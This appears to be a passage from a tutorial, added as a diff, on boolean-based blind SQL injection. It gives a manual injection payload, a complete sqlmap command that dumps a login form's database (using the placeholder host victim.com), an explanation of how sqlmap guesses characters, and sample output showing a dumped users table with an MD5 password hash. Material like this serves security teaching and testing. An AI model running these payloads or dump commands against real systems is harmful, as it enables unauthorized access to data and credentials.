@@ -1,0 +1,64 @@
+2️⃣ Manual Boolean-based Blind Payload
+
+Manually, you’d test with:
+
+' OR SUBSTRING(username,1,1)='a'--
+
+
+If the response is different when the condition is true, you can infer that the first letter is a.
+
+3️⃣ Automating with sqlmap
+
+Instead of guessing letter by letter, sqlmap will do this automatically.
+
+Example sqlmap Command:
+sqlmap -u "http://victim.com/login.php" \
+--data="username=admin&password=pass" \
+-p username \
+--dbms=mysql \
+--technique=B \
+--dump
+
+🔎 Explanation of options:
+
+-u → Target URL.
+
+--data → POST data being sent (as if filling in login form).
+
+-p username → Tells sqlmap to test only the username parameter for injection.
+
+--dbms=mysql → (optional) Speeds things up if you know the backend DB.
+
+--technique=B → Only test Boolean-based blind injection.
+
+--dump → Extract data (tables + rows).
+
+4️⃣ What Happens Internally
+
+sqlmap injects conditions like:
+
+' OR SUBSTRING(username,1,1)='a'--
+' OR SUBSTRING(username,1,1)='b'--
+
+
+It observes the true/false difference (page load, error, redirect, etc.).
+
+It loops through characters (a → z, 0 → 9, symbols, etc.).
+
+It reconstructs the entire username automatically.
+
+5️⃣ Example Output
+
+When it succeeds, sqlmap might show:
+
+Database: appdb
+Table: users
+[1 entry]
++----+----------+----------+
+| id | username | password |
++----+----------+----------+
+| 1  | admin    | 5f4dcc3b5aa765d61d8327deb882cf99 |
++----+----------+----------+
+
+
+Here 5f4dcc3b5aa765d61d8327deb882cf99 is the MD5 hash of "password".
